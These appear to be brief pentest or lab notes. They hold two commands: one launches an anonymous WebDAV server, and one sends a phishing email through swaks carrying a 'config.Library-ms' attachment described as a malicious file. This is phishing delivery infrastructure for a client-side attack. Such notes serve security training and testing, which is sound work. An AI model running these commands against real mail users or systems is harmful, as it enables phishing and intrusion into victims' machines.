```
/usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

Craft email to place malicious file over smtp
```
sudo  swaks --auth-user test@supermagicorg.com --auth-password test --to dave.wizard@supermagicorg.com --from test@supermagicorg.com --server supermagicorg.com --attach config.Library-ms --port 25
```